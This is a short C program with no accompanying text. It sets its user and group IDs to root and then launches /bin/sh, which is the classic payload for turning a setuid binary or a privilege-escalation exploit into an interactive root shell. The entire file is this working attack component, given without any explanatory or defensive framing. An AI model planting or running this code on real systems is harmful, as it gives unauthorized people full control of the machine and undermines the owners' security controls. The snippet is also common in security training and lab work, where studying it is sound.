#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    char *a[] = {"/bin/sh", NULL};
    execv("/bin/sh", a);
    return 0;
}
